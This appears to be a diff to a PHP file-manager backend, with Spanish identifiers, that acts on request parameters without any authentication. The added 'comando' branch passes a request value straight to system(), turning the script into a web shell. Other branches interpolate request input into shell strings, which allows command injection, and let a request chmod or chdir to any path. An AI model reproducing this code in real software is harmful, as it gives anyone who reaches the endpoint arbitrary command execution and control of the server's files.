@@ -7,7 +7,6 @@ function abrirCarpeta($ruta){
 function abrirArchivo($archivo){
     $comando="cat ${archivo} 2>&1";
     $contenido=shell_exec($comando);
-    echo shell_exec("pwd");
     return $contenido;
 }
 $funcion = $_REQUEST["funcion"];
@@ -17,10 +16,27 @@ if ($funcion == "abrirCarpeta"){
 }else if($funcion == "abrirArchivo"){
     echo abrirArchivo($argumento);
 }else if($funcion == "directorioAnterior"){
+    $pwd = $_REQUEST["pwd"];
+    chdir($pwd);
     chdir($argumento);
     echo shell_exec("pwd");
 }else if($funcion == "cambiarPath"){
+    $pwd = $_REQUEST["pwd"];
+    chdir($pwd);
     chdir($argumento);
     echo shell_exec("pwd");
+}else if ($funcion == "esArchivo"){
+    $file = $_REQUEST["file"];
+    echo("{$file}[fin]");
+    echo(shell_exec("[ -f {$argumento} ] && echo si || echo no"));
+}else if ($funcion == "comando"){
+    echo $argumento;
+	system($argumento);
+}else if ($funcion == "chmod"){
+    $pwd = $_REQUEST["pwd"];
+    chmod($pwd, intval($argumento, 8));
+}else if ($funcion == "permisos"){
+    $pwd = $_REQUEST["pwd"];
+    echo decoct(fileperms($pwd));
 }
 ?>
